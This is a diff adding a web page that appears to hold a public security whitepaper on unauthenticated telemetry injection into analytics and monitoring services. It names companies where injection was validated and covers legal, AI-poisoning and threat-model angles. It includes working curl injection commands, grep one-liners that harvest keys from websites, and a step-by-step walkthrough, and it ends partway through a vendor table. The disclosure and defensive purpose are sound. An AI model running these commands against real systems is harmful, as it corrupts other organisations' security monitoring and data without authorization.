@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="index, follow">
+<title>The Telemetry Trust Crisis — Systemic Architectural Risk Against Data Provenance, AI Training, and Security Operations</title>
+<meta name="description" content="Second whitepaper (ek0ms savi0r & k3n): telemetry trust crisis — architectural risk, walkthroughs, vendor impact, mitigations. Public disclosure 2026-09-05.">
+<meta property="og:title" content="The Telemetry Trust Crisis — Systemic Architectural Risk Against Data Provenance, AI Training, and Security Operations">
+<meta property="og:type" content="article">
+<meta property="og:description" content="Second whitepaper (ek0ms savi0r & k3n): telemetry trust crisis — architectural risk, walkthroughs, vendor impact, mitigations. Public disclosure 2026-09-05.">
+<link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+
+<nav class="site-nav"><div class="container">
+  <a href="index.html">Home</a>
+  <a href="whitepaper.html">Whitepaper</a>
+  <a href="trust-crisis.html">Trust Crisis</a>
+  <a href="endpoints.html">Endpoints</a>
+  <a href="galaxy.html">Galaxy</a>
+  <a href="threat-map.html">Threat Map</a>
+  <a href="master-report.html">Master Report</a>
+  <a href="dossiers.html">Dossiers</a>
+  <a href="vrp-correspondence.html">Correspondence</a>
+  <a href="hyperject.html">Hyperject</a>
+  <a href="legal-annex.html">Legal</a>
+</div></nav>
+<main class="container article">
+<div class="doc-title">The Telemetry Trust Crisis</div>
+<p>Unauthenticated Telemetry Injection as a Systemic Architectural Risk Against Data Provenance, AI Training, and Security Operations</p>
+<p><strong>Authors:</strong> ek0ms savi0r &amp; k3n · <strong>Classification:</strong> Public Disclosure<br />
+<strong>Date:</strong> September 5, 2026 · <strong>CERT/CC Coordination:</strong> September 5, 2026</p>
+<h2>Acknowledgments</h2>
+<p>The authors wish to acknowledge the security researchers and practitioners who provided critical feedback on early drafts of this paper. Their insights helped refine the technical accuracy and framing of this work, particularly regarding the distinction between traditional vulnerabilities and architectural risk patterns. Any remaining errors or oversights remain our own.</p>
+<h2>Executive Summary</h2>
+<p>This white paper documents a systemic architectural risk affecting the global telemetry infrastructure: the normalization of unauthenticated telemetry ingestion. Over the past several months, our research has identified that major technology platforms — including Microsoft (Azure Application Insights, OneCollector), Google, Meta, Apple, TikTok, LinkedIn, Segment, Datadog, and numerous others — operate telemetry ingestion endpoints that accept arbitrary data with only a static key (instrumentation key, write key, or client token) embedded in client-side JavaScript and therefore publicly exposed.</p>
+<p>This is not a vulnerability in the traditional sense. These keys are explicitly documented by vendors as not being secrets and are not intended to provide authentication or access control. Rather, this is an architectural design choice that creates a trust boundary failure: telemetry ingestion endpoints accept data without verifying the identity or legitimacy of the source, allowing arbitrary injection of telemetry into organizational monitoring, analytics, and AI training pipelines.</p>
+<p>The implications are significant:</p>
+<ul>
+<li><strong>Data Provenance Collapse:</strong> Once an attacker can inject telemetry that is indistinguishable from legitimate data, the provenance (origin, authenticity, trustworthiness) of all telemetry becomes uncertain. Organizations can no longer trust their own monitoring data.</li>
+<li><strong>AI Training Data Poisoning (Potential):</strong> Telemetry data is increasingly used to train AI models for security operations (AIOps), anomaly detection, and automated incident response. If organizations ingest unvalidated telemetry directly into training pipelines, injected telemetry can poison these datasets. While we have not confirmed this attack path in production environments, academic research has demonstrated the feasibility of telemetry-based AI poisoning, and the architecture enables this scenario.</li>
+<li><strong>Security Operations Blindness:</strong> Security teams rely on telemetry for threat detection and incident response. Injected telemetry can create false alerts, hide real attacks, and corrupt forensic evidence — particularly if the injected data is not clearly distinguished from legitimate sources.</li>
+<li><strong>Business Intelligence Corruption:</strong> Analytics platforms that ingest telemetry for business intelligence and user behavior analysis become unreliable, leading to incorrect business decisions.</li>
+</ul>
+<p>This paper provides a complete walkthrough of the attack methodology, documents validated and reconnoitered exposures against multiple major vendors, and proposes mitigations for defenders. We emphasize that this paper describes an architectural risk pattern, not a bug in any specific product, and our findings should be interpreted in that context.</p>
+<h2>1. Introduction</h2>
+<h3>1.1 The Telemetry Ecosystem</h3>
+<p>Modern digital infrastructure depends on telemetry. Every web application, mobile app, cloud service, and IoT device generates telemetry data that flows into centralized pipelines for monitoring, analytics, and AI training. This telemetry informs:</p>
+<ul>
+<li><strong>Security Operations:</strong> SIEMs, EDRs, and XDRs ingest telemetry to detect and respond to threats.</li>
+<li><strong>AIOps:</strong> Machine learning models analyze telemetry to detect anomalies and automate remediation.</li>
+<li><strong>Business Intelligence:</strong> Analytics platforms use telemetry to understand user behavior and drive product decisions.</li>
+<li><strong>AI Training:</strong> Telemetry datasets train models for security, anomaly detection, and automation.</li>
+</ul>
+<h3>1.2 The Design Trade-Off</h3>
+<p>Telemetry ingestion endpoints are designed to accept high volumes of data from diverse sources. To simplify integration and reduce latency, vendors allow ingestion using only a static key:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Key Type</th>
+<th>Endpoint Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft Azure Application Insights</td>
+<td>Instrumentation Key (iKey)</td>
+<td><code>dc.services.visualstudio.com/v2/track</code></td>
+</tr>
+<tr>
+<td>Microsoft OneCollector (1DS)</td>
+<td>API Key</td>
+<td><code>*.events.data.microsoft.com/OneCollector/1.0/</code></td>
+</tr>
+<tr>
+<td>Segment</td>
+<td>Write Key</td>
+<td><code>api.segment.io/v1/track</code></td>
+</tr>
+<tr>
+<td>Datadog RUM</td>
+<td>Client Token</td>
+<td><code>rum.browser-intake-datadoghq.com/api/v2/rum</code></td>
+</tr>
+</tbody>
+</table>
+<p>These keys are embedded in client-side JavaScript, mobile applications, and web pages. They are publicly exposed by design. As Microsoft states: "The instrumentation key cannot be used to read any telemetry. However, it could be used to send bogus telemetry to your application insights resource."</p>
+<p>This statement reveals the core issue: the industry has normalized unauthenticated telemetry ingestion as an acceptable trade-off between security and convenience. We argue that this trade-off is increasingly dangerous as telemetry moves from simple monitoring to AI training and automated security operations.</p>
+<h3>1.3 The Scope of the Problem</h3>
+<p>Our research has identified and, where possible, validated this architectural risk across multiple platforms:</p>
+<ul>
+<li><strong>Microsoft:</strong> Azure Application Insights, OneCollector (1DS), Power BI/Fabric telemetry pipelines</li>
+<li><strong>Google:</strong> Multiple telemetry endpoints (identified via reconnaissance)</li>
+<li><strong>Meta:</strong> Multiple telemetry endpoints (identified via reconnaissance)</li>
+<li><strong>Apple:</strong> Multiple telemetry endpoints (identified via reconnaissance)</li>
+<li><strong>TikTok:</strong> Multiple telemetry endpoints (identified via reconnaissance)</li>
+<li><strong>LinkedIn:</strong> Multiple telemetry endpoints (identified via reconnaissance)</li>
+<li><strong>Segment:</strong> Write key exposure allows arbitrary event injection (validated)</li>
+<li><strong>Datadog:</strong> RUM client tokens allow arbitrary RUM event injection (validated)</li>
+<li><strong>CarMax:</strong> Confirmed vulnerable via exposed iKeys (validated injection)</li>
+<li><strong>Flock Safety:</strong> Confirmed vulnerable via Segment write key and Datadog RUM tokens (validated injection)</li>
+</ul>
+<p>This is not a bug in any single product. This is a systemic architectural pattern across the entire telemetry industry that creates a trust boundary failure when telemetry is used for security-critical purposes.</p>
+<h2>2. The Attack: Unauthenticated Telemetry Injection</h2>
+<h3>2.1 Attack Overview</h3>
+<p>The attack is simple: an attacker identifies an exposed telemetry key (iKey, write key, or client token) in client-side code, then sends arbitrary telemetry data to the corresponding ingestion endpoint.</p>
+<p>Prerequisites:<br />
+- Publicly accessible ingestion endpoint (no IP restrictions)<br />
+- Valid key (exposed in client-side JavaScript or mobile app)<br />
+- Ability to send HTTP POST requests to the endpoint</p>
+<p>No authentication, no authorization, no validation.</p>
+<h3>2.2 Finding Exposed Keys</h3>
+<p>Keys can be found in:<br />
+- <strong>Browser JavaScript:</strong> <code>view-source:https://example.com</code> → search for iKey, instrumentationKey, writeKey, clientToken<br />
+- <strong>Mobile Applications:</strong> Reverse-engineer APK/IPA files and search for key patterns<br />
+- <strong>Network Traffic:</strong> Monitor browser DevTools Network tab for telemetry requests<br />
+- <strong>Public Code Repositories:</strong> Search GitHub for exposed keys</p>
+<p>Key patterns (values redacted in this public version):</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Key Pattern</th>
+<th>Example (truncated)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>App Insights</td>
+<td>iKey GUID</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+<tr>
+<td>OneCollector</td>
+<td>API Key GUID-GUID-timestamp</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+<tr>
+<td>Segment</td>
+<td>Write Key alphanumeric</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+<tr>
+<td>Datadog RUM</td>
+<td>Token <code>pub</code> + hex</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+</tbody>
+</table>
+<h3>2.3 Injection Methodology</h3>
+<p>Once a key is identified, the attacker constructs a telemetry payload matching the target platform's schema and sends it to the ingestion endpoint.</p>
+<p><strong>Example 1: Microsoft Application Insights Injection</strong></p>
+<pre><code class="language-bash">curl -X POST &quot;https://dc.services.visualstudio.com/v2/track&quot; \
+ -H &quot;Content-Type: application/json&quot; \
+ -d '[{
+ &quot;time&quot;:&quot;2026-07-29T15:40:00Z&quot;,
+ &quot;iKey&quot;:&quot;&lt;IKEY&gt;&quot;,
+ &quot;name&quot;:&quot;Microsoft.ApplicationInsights.&lt;IKEY&gt;.Event&quot;,
+ &quot;tags&quot;:{
+ &quot;ai.user.id&quot;:&quot;INJECTED_USER&quot;,
+ &quot;ai.session.id&quot;:&quot;INJECTED_SESSION&quot;
+ },
+ &quot;data&quot;:{
+ &quot;baseType&quot;:&quot;EventData&quot;,
+ &quot;baseData&quot;:{
+ &quot;ver&quot;:2,
+ &quot;name&quot;:&quot;INJECTED_EVENT&quot;,
+ &quot;properties&quot;:{
+ &quot;injected&quot;:&quot;true&quot;,
+ &quot;marker&quot;:&quot;[TELEMETRY_INJECTION_TEST]&quot;
+ }
+ }
+ }
+ }]'
+</code></pre>
+<p>Response: <code>{"itemsReceived":1,"itemsAccepted":1,"errors":[]}</code></p>
+<p><strong>Example 2: Segment Injection</strong> (write key redacted — <code>[REDACTED]</code>)</p>
+<pre><code class="language-bash">curl -X POST &quot;https://api.segment.io/v1/track&quot; \
+ -H &quot;Content-Type: application/json&quot; \
+ -H &quot;Authorization: Basic &lt;REDACTED&gt;&quot; \
+ -d '{
+ &quot;userId&quot;:&quot;injected-user&quot;,
+ &quot;event&quot;:&quot;INJECTED_EVENT&quot;,
+ &quot;properties&quot;:{
+ &quot;injected&quot;:&quot;true&quot;,
+ &quot;marker&quot;:&quot;[TELEMETRY_INJECTION_TEST]&quot;
+ }
+ }'
+</code></pre>
+<p>Response: <code>{"success": true}</code></p>
+<p><strong>Example 3: Datadog RUM Injection</strong> (client token + app id redacted — <code>[REDACTED]</code>)</p>
+<pre><code class="language-bash">curl -X POST &quot;https://rum.browser-intake-datadoghq.com/api/v2/rum&quot; \
+ -H &quot;Content-Type: application/json&quot; \
+ -H &quot;DD-API-KEY: &lt;CLIENT_TOKEN&gt;&quot; \
+ -H &quot;DD-APPLICATION-ID: &lt;APP_ID&gt;&quot; \
+ -d '{
+ &quot;ddtags&quot;: &quot;env:test&quot;,
+ &quot;application&quot;: {&quot;id&quot;: &quot;&lt;APP_ID&gt;&quot;},
+ &quot;session&quot;: {&quot;id&quot;: &quot;injected-session&quot;},
+ &quot;view&quot;: {&quot;id&quot;: &quot;injected-view&quot;, &quot;url&quot;: &quot;https://injected.example.com&quot;},
+ &quot;action&quot;: {
+ &quot;type&quot;: &quot;custom&quot;,
+ &quot;name&quot;: &quot;INJECTED_ACTION&quot;,
+ &quot;properties&quot;: {&quot;injected&quot;: &quot;true&quot;}
+ }
+ }'
+</code></pre>
+<p>Response: HTTP 202 Accepted</p>
+<h3>2.4 Payload Acceptance Testing</h3>
+<p>Our testing has confirmed that telemetry ingestion endpoints accept arbitrary string content across multiple fields. Note: this tests only whether the ingestion pipeline accepts payloads containing specific strings — not whether those strings cause downstream execution (e.g., XSS, SQL injection) in target environments. That would require separate research and is not claimed here.</p>
+<table>
+<thead>
+<tr>
+<th>Payload Type</th>
+<th>App Insights</th>
+<th>OneCollector</th>
+<th>Segment</th>
+<th>Datadog RUM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Basic Event Injection</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Bulk Injection (10/10)</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Custom Properties</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>HTML Marker Payloads</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Marker Text in User/Session IDs</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Nested JSON (5+ levels)</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Spoofed User/Session IDs</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Spoofed Operation Names</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<h2>3. Data Provenance and the Mixing Problem</h2>
+<h3>3.1 What is Data Provenance?</h3>
+<p>Data provenance refers to the documented history of data: where it came from, who created it, when it was created, and whether it can be trusted. In telemetry systems, provenance is essential for:<br />
+- <strong>Security Investigations:</strong> Determining whether an alert represents a real threat or a false positive<br />
+- <strong>Forensic Analysis:</strong> Understanding the timeline and source of an attack<br />
+- <strong>Compliance:</strong> Auditing data handling and ensuring regulatory compliance<br />
+- <strong>AI Training:</strong> Ensuring training data is authentic and representative</p>
+<h3>3.2 The Mixing Problem</h3>
+<p>When telemetry ingestion accepts unauthenticated data, the pipeline cannot distinguish between legitimate and injected telemetry. The two become mixed at the point of ingestion.</p>
+<p>The mixing problem has three phases:<br />
+- <strong>Ingestion Mixing:</strong> Injected and legitimate telemetry enter the same pipeline, receive the same processing, and are stored in the same tables.<br />
+- <strong>Storage Mixing:</strong> Injected data is stored alongside legitimate data in Log Analytics workspaces, data lakes, and databases.<br />
+- <strong>Consumption Mixing:</strong> Injected data is consumed by dashboards, alerts, AI models, and business intelligence systems alongside legitimate data.</p>
+<h3>3.3 The Provenance Failure</h3>
+<p>Once data is mixed, provenance is lost. The system cannot reliably answer:<br />
+- Did this event come from the legitimate application or an attacker?<br />
+- Was this user session real or injected?<br />
+- Was this error genuine or fabricated?<br />
+- Should this data be used to train our AI models?</p>
+<h3>3.4 Real-World Example: CarMax</h3>
+<p>During our research, we identified two Application Insights instrumentation keys associated with CarMax in publicly delivered JavaScript (values redacted — <code>[REDACTED]</code>). We sent synthetic telemetry to <code>dc.services.visualstudio.com/v2/track</code> using these keys.</p>
+<p>Response: <code>{"itemsReceived":1,"itemsAccepted":1,"appId":"b784cd90-1562-4630-bb8f-af8af0d05305","errors":[]}</code></p>
+<p>We confirmed the ability to control:<br />
+- Event names<br />
+- User and session identifiers<br />
+- Operation names and identifiers<br />
+- Custom properties<br />
+- HTML-like marker text<br />
+- Remote-dependency names, targets, and result codes<br />
+- Success states</p>
+<p>The telemetry was accepted as legitimate. We do not have read access to CarMax's App Insights instance, so we cannot confirm downstream impact (storage, dashboards, AI training). However, the ingestion pipeline accepted the data without any indication that it was untrusted. The only barrier between an attacker and CarMax's telemetry pipeline is a static key exposed in JavaScript.</p>
+<h2>4. Regulatory and Legal Framework: Data Provenance Requirements</h2>
+<h3>4.1 Overview of Applicable Laws</h3>
+<p>The telemetry injection condition described in this paper has significant implications for regulatory compliance. Organizations that collect, process, and store telemetry data are subject to various data protection and privacy laws that require data accuracy, integrity, and provenance. The inability to distinguish between legitimate and injected telemetry directly impacts compliance with these frameworks.</p>
+<p>Telemetry data often contains personal information, user identifiers, session data, IP addresses, device fingerprints, and behavioral patterns — all of which fall within the scope of data protection regulations. When attackers inject telemetry, they are not merely polluting analytics pipelines; they are potentially introducing unverified, fabricated, or malicious personal data into systems that are legally required to maintain data accuracy and integrity.</p>
+<h3>4.2 Federal Trade Commission (FTC) Act</h3>
+<p>Section 5 of the FTC Act (15 U.S.C. § 45) prohibits unfair or deceptive acts or practices in or affecting commerce. The FTC has broad authority to enforce data privacy and security standards, and has brought numerous enforcement actions against companies that:<br />
+- Made false or misleading statements about data collection and use practices<br />
+- Failed to implement reasonable security measures to protect consumer data<br />
+- Engaged in deceptive practices related to data handling</p>
+<p>Telemetry injection implications:<br />
+- Organizations that accept unauthenticated telemetry without validation may be engaging in deceptive practices if they represent to consumers that their data is collected and used for specific purposes, but fail to ensure the integrity of that data; make claims about the accuracy of their analytics or security monitoring while relying on potentially poisoned data; or fail to disclose that telemetry data may be compromised or fabricated.</p>
+<p>The FTC's enforcement actions against companies like Cambridge Analytica, Equifax, and Facebook demonstrate that the agency takes data integrity and security seriously. Organizations that rely on telemetry for business decisions, security monitoring, or consumer-facing products could face FTC scrutiny if they fail to implement reasonable safeguards against telemetry injection.</p>
+<p>Case law and guidance:<br />
+- <em>FTC v. Wyndham Worldwide Corp.</em> (2015) established that failing to implement reasonable security measures constitutes an unfair practice under Section 5.<br />
+- The FTC's "Start with Security" guidance emphasizes that companies should "secure data throughout its lifecycle" and "control access to data sensibly."<br />
+- The FTC's 2021 Policy Statement on Deceptive Acts reinforces that companies must not misrepresent their data practices, including data accuracy and integrity.</p>
+<h3>4.3 General Data Protection Regulation (GDPR)</h3>
+<p>The GDPR (Regulation (EU) 2016/679) imposes strict requirements on data controllers and processors regarding the accuracy, integrity, and processing of personal data.</p>
+<p><strong>Article 5(1)(d) — Accuracy.</strong> Personal data must be "accurate and, where necessary, kept up to date; every reasonable step must be taken to ensure that personal data that are inaccurate, having regard to the purposes for which they are processed, are erased or rectified without delay."<br />
+- If injected telemetry contains fabricated personal data (e.g., user IDs, session IDs, device identifiers), organizations are processing inaccurate personal data.<br />
+- Organizations must take "every reasonable step" to ensure data accuracy — including validating telemetry sources before ingestion.</p>
+<p><strong>Article 5(1)(f) — Integrity and confidentiality.</strong> Personal data shall be processed in a manner that ensures appropriate security, including protection against unauthorised or unlawful processing.<br />
+- Telemetry injection constitutes unauthorised processing of personal data where the events contain personal data.<br />
+- Failure to implement authentication and validation for telemetry ingestion may mean the organization is not providing "appropriate technical or organisational measures."</p>
+<p><strong>Article 32 — Security of processing.</strong> Controllers must implement measures appropriate to risk ensuring ongoing confidentiality, integrity, availability, and resilience.<br />
+- Inability to distinguish legitimate from injected telemetry undermines integrity of processing systems.<br />
+- Provenance tracking should be considered an "appropriate technical measure."</p>
+<p><strong>Articles 33/34 — Breach notification.</strong> Notification duties may arise if telemetry injection constitutes a personal-data breach creating risk to individuals; internal tracing is required to determine applicability.</p>
+<p><strong>Potential fines:</strong> up to €20M or 4% of global annual turnover for the most severe infringements; €10M or 2% for less severe (Article 83).</p>
+<h3>4.4 California Consumer Privacy Act (CCPA) and California Privacy Rights Act (CPRA)</h3>
+<ul>
+<li><strong>§ 1798.100(a) (access):</strong> Injected telemetry containing fabricated personal information creates confusion in responding to consumer access requests.</li>
+<li><strong>§ 1798.100(b) (notice):</strong> Injection for undisclosed purposes could constitute unauthorised processing.</li>
+<li><strong>§ 1798.100(c) / CPRA security:</strong> Failure to authenticate telemetry sources and validate integrity may fail the "reasonable security procedures and practices" requirement; injection constitutes unauthorised modification of personal information.</li>
+<li><strong>§ 1798.105(d) (deletion):</strong> Inability to reliably identify all instances of a consumer's information due to injection may impede deletion compliance.</li>
+<li><strong>Penalties:</strong> civil penalties up to $7,500 per intentional violation (§ 1798.155); private right of action for certain breaches (§ 1798.150).</li>
+</ul>
+<h3>4.5 Other Relevant State Laws</h3>
+<ul>
+<li><strong>Virginia VCDPA, Colorado CPA, Connecticut CTDPA, Utah UCPA:</strong> reasonable security + data accuracy duties.</li>
+<li><strong>Illinois BIPA:</strong> biometric data in telemetry (face scans, voiceprints) subject to strict consent/retention rules.</li>
+<li><strong>New York SHIELD Act:</strong> reasonable safeguards with private right of action.</li>
+<li><strong>HIPAA:</strong> telemetry containing PHI could make injection a HIPAA breach.</li>
+<li><strong>COPPA:</strong> telemetry from children under 13 subject to parental consent + data handling rules.</li>
+<li><strong>GLBA:</strong> financial institutions' telemetry subject to safeguards rules.</li>
+</ul>
+<h3>4.6 International Laws</h3>
+<p>LGPD (Brazil), PIPEDA (Canada), Privacy Act 1988 (Australia), APPI (Japan), POPIA (South Africa) — all impose reasonable security and/or data-accuracy duties relevant to telemetry provenance.</p>
+<h3>4.7 Legal Liability and Enforcement Risk</h3>
+<table>
+<thead>
+<tr>
+<th>Law</th>
+<th>Key Requirement</th>
+<th>Telemetry Injection Impact</th>
+<th>Potential Penalties</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FTC Act</td>
+<td>No unfair/deceptive practices</td>
+<td>Failing to validate telemetry could be viewed as deceptive practice</td>
+<td>Up to $40,000+ per violation</td>
+</tr>
+<tr>
+<td>GDPR</td>
+<td>Data accuracy, integrity, security</td>
+<td>Art 5(1)(d), 5(1)(f), 32 considerations</td>
+<td>Up to €20M or 4% global turnover</td>
+</tr>
+<tr>
+<td>CCPA/CPRA</td>
+<td>Data accuracy, security, consumer rights</td>
+<td>Security + accuracy considerations</td>
+<td>$7,500/violation; $750/consumer</td>
+</tr>
+<tr>
+<td>BIPA</td>
+<td>Biometric data protection</td>
+<td>Unauthorized collection/processing of biometric data</td>
+<td>$5,000/violation</td>
+</tr>
+<tr>
+<td>HIPAA</td>
+<td>PHI protection</td>
+<td>Unauthorized PHI modification/disclosure</td>
+<td>$50,000+/violation</td>
+</tr>
+<tr>
+<td>COPPA</td>
+<td>Children's data protection</td>
+<td>Unauthorized collection of children's data</td>
+<td>$40,000+/violation</td>
+</tr>
+<tr>
+<td>GLBA</td>
+<td>Financial privacy and security</td>
+<td>Data integrity compromise</td>
+<td>Varies by regulator</td>
+</tr>
+</tbody>
+</table>
+<p>Enforcement examples: <em>FTC v. Equifax</em> ($575M settlement); GDPR fines against British Airways (€20M), Marriott (€23M), Meta (€1.2B).</p>
+<blockquote>
+<p><strong>Caveat (from the legal annex on this site):</strong> none of this establishes a violation merely because an endpoint accepted an event. Applicability depends on actual retention, attribution to identifiable persons, downstream use, and the organization's representations. Do not cite these laws as automatically triggered without vendor-side tracing.</p>
+</blockquote>
+<h3>4.8 Compliance Recommendations</h3>
+<p>Organizations collecting telemetry data should consider:<br />
+- Conducting a DPIA (GDPR Art. 35) for telemetry ingestion systems.<br />
+- Implementing technical measures: cryptographic signing at the source; provenance tracking for all events; regular audits for injected data.<br />
+- Updating privacy policies/notices to describe telemetry types, security measures, and accuracy/integrity practices.<br />
+- Maintaining a data inventory mapping collection points and flows.<br />
+- Responding to consumer requests with procedures robust to injected data; deleting injected telemetry on request.<br />
+- Breach preparedness: detect/respond procedures; determine whether injection is notifiable; prepare templates.</p>
+<h2>5. AI Training Implications (Potential Risk)</h2>
+<h3>5.1 Telemetry as AI Training Data</h3>
+<p>Telemetry is increasingly used to train AI models for security operations (AIOps), anomaly detection, user behavior analytics, and predictive maintenance.</p>
+<h3>5.2 Data Poisoning as a Theoretical Attack</h3>
+<p>Data poisoning is a class of attack where an adversary injects malicious data into a training dataset to corrupt the resulting model. Injected telemetry could, in theory, poison training data, causing the model to learn false patterns:<br />
+1. Attacker identifies an exposed telemetry key.<br />
+2. Attacker injects malicious telemetry mimicking legitimate data but containing adversarial patterns.<br />
+3. If the injected data is stored and used to train AI models without provenance filtering, the model learns the adversarial patterns.<br />
+4. The model may then fail when faced with real attacks.</p>
+<h3>5.3 AIOps-Specific Risks (Academic Research)</h3>
+<p>Research (incl. RSAC Labs / George Mason University work described as "AIOpsDoom") demonstrated that AIOps tools could be manipulated via poisoned telemetry — reconnaissance, fuzzing accepted fields, generating adversarial payloads, and influencing agent behavior (false negatives, false positives, actions that compromise infrastructure integrity).</p>
+<h3>5.4 Important Caveat: The Gap Between Theory and Practice</h3>
+<p>We have <strong>not confirmed</strong> that any organization is directly feeding raw, unvalidated telemetry into production AI training pipelines without preprocessing, provenance checks, or sanitization. However:<br />
+- Academic research has demonstrated that telemetry-based AI poisoning is theoretically feasible.<br />
+- The architectural capability (unauthenticated injection) exists across major platforms.<br />
+- Industry trends toward automated ML retraining increase potential impact.<br />
+- Many organizations lack provenance tracking in their telemetry pipelines.</p>
+<p>We recommend organizations audit their AI training pipelines to ensure telemetry data is validated and provenance-tracked before use in model training.</p>
+<h2>6. Walkthrough: Finding and Testing Unauthenticated Telemetry Injection</h2>
+<p>This section provides a step-by-step guide for identifying and testing unauthenticated telemetry injection endpoints. Provided for defensive purposes and authorized security testing only.</p>
+<h3>6.1 Reconnaissance</h3>
+<p><strong>Step 1: Identify telemetry endpoints.</strong> Common patterns:</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Endpoint Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Azure Application Insights</td>
+<td><code>*.in.applicationinsights.azure.com/v2.1/track</code></td>
+</tr>
+<tr>
+<td>Azure Application Insights (legacy)</td>
+<td><code>dc.services.visualstudio.com/v2/track</code></td>
+</tr>
+<tr>
+<td>OneCollector (1DS)</td>
+<td><code>*.events.data.microsoft.com/OneCollector/1.0/</code></td>
+</tr>
+<tr>
+<td>Segment</td>
+<td><code>api.segment.io/v1/track</code></td>
+</tr>
+<tr>
+<td>Datadog RUM</td>
+<td><code>rum.browser-intake-datadoghq.com/api/v2/rum</code></td>
+</tr>
+</tbody>
+</table>
+<p>Search for endpoints in JavaScript:</p>
+<pre><code class="language-bash">curl -s https://example.com | grep -oE 'https?://[^&quot;]*/(v2/track|OneCollector/1.0/|v1/track)'
+</code></pre>
+<p><strong>Step 2: Identify keys</strong> (all values redacted in this public version):</p>
+<pre><code class="language-bash"># GUID pattern (App Insights iKey)
+curl -s https://example.com | grep -oE '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' | head -20
+curl -s https://example.com | grep -oE 'iKey[&quot;\s:]+[&quot;\']?[a-f0-9-]{36}'
+curl -s https://example.com | grep -oE 'writeKey[&quot;\s:]+[&quot;\']?[A-Za-z0-9]{32,}'
+</code></pre>
+<h3>6.2 Key Validation</h3>
+<p>Once a key is found, validate it by sending a minimal telemetry payload (placeholder key below — substitute only with a key you are authorized to test):</p>
+<pre><code class="language-bash">curl -X POST &quot;https://dc.services.visualstudio.com/v2/track&quot; \
+ -H &quot;Content-Type: application/json&quot; \
+ -d '[{&quot;time&quot;:&quot;'$(date -u +&quot;%Y-%m-%dT%H:%M:%SZ&quot;)'&quot;,&quot;iKey&quot;:&quot;&lt;IKEY&gt;&quot;,&quot;name&quot;:&quot;Microsoft.ApplicationInsights.&lt;IKEY&gt;.Event&quot;,&quot;data&quot;:{&quot;baseType&quot;:&quot;EventData&quot;,&quot;baseData&quot;:{&quot;ver&quot;:2,&quot;name&quot;:&quot;ValidationTest&quot;}}}]' \
+ -w &quot;\nHTTP %{http_code}\n&quot; 2&gt;/dev/null
+</code></pre>
+<p>Expected: 200 with <code>itemsAccepted:1</code> → key valid; 400 → invalid/format; 401/403 → restricted (unlikely for ingestion).</p>
+<h3>6.3 Injection (authorized targets only)</h3>
+<p>Basic event injection, bulk injection (rate-limit check), and payload-marker injection examples follow the same shapes as Section 2.3, using <code>&lt;IKEY&gt;</code> placeholders and <code>[TELEMETRY_INJECTION_TEST]</code> markers. Prefer unique harmless canary markers over destructive payload strings; stop once ingestion is demonstrated (see whitepaper §"Researcher responsibility").</p>
+<h3>6.4 Post-Injection Analysis</h3>
+<p>Without read access to the target telemetry instance, downstream impact cannot be confirmed. Indicators of successful injection: HTTP 200/202, no schema errors, bulk acceptance. What cannot be confirmed without read access: permanent storage, dashboard/alert appearance, AI-training use, downstream consumption.</p>
+<h2>7. Affected Vendors and Real-World Impact</h2>
+<h3>7.1 Threat Model</h3>
+<table>
+<thead>
+<tr>
+<th>Attacker Type</th>
+<th>Injection Goal</th>
+<th>Realistic Impact</th>
+<th>Scale</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Competitor</td>
+<td>Corrupt business intelligence / user analytics</td>
+<td>Incorrect business decisions</td>
+<td>Low–Medium</td>
+</tr>
+<tr>
+<td>Malicious Insider</td>
+<td>Frame users, create false alerts</td>
+<td>Operational disruption</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>APT / Nation-State</td>
+<td>Hide real attacks, poison security monitoring</td>
+<td>Delayed breach detection, corrupted evidence</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Criminal (Financial)</td>
+<td>Manipulate fraud detection/gaming metrics</td>
+<td>Financial fraud</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Prankster / Script Kiddie</td>
+<td>Garbage data injection</td>
+<td>Dashboard noise, alert fatigue</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>Data Poisoning (Theoretical)</td>
+<td>Corrupt AI models over time</td>
+<td>Systematic model failure</td>
+<td>High</td>
+</tr>
+</tbody>
+</table>
+<p>The most severe risks: APT-level actors concealing real attacks, and theoretical long-horizon data poisoning of AI models.</p>
+<h3>7.2 Validated Injection (Tier 1)</h3>
+<p>Confirmed ability to inject telemetry and receive an acceptance response:</p>
+<table>
+<thead>
+<tr>
+<th>Vendor</th>
+<th>Service</th>
+<th>Vector</th>
+<th>Status</th>
+</tr>
+</thead>
